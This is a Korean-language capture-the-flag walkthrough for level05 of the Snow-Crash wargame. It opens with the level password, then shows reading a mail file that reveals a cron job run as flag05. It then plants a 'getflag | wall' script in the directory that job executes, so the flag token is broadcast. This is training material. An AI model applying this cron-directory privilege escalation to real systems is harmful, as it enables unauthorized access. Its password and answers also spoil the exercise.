> Password: ne2searoevaevoem4ov4ar8ap

# 접근 방법

```
% ssh -p 4242 level05@127.0.0.1
level05@127.0.0.1's password:
You have new mail.
```

`level05`로 `snow-crash`에 접속하면, 메일이 있다는 알림을 볼 수 있다.

해당 내용을 확인하기 위해 `/var/mail/level05` 경로의 내용을 읽는다.

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

그러면 위와 같은 내용이 있다. 내용 포맷을 보아, `crontab` 스케쥴링에 관련된 것으로 보인다. 여기에서 `flag05`의 권한으로 2분마다, `/usr/sbin/openarenaserver` 파일을 실행하는 것을 알 수 있다.

해당 `/usr/sbin/openarenaserver` 파일의 내용을 확인해보면 다음과 같다.

```bash
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

`/opt/openarenaserver` 내부의 모든 스크립트를 `bash -x` 로 실행한 후, 실행한 셸 스크립트를 삭제하는 내용이다.

따라서 `/opt/openarenaserver` 디렉토리 내부에 `getflag | wall`의 내용이 담긴 스크립트를 작성하고, 최대 2분 기다리면 `flag05`의 `token`이 브로드캐스팅 된다.
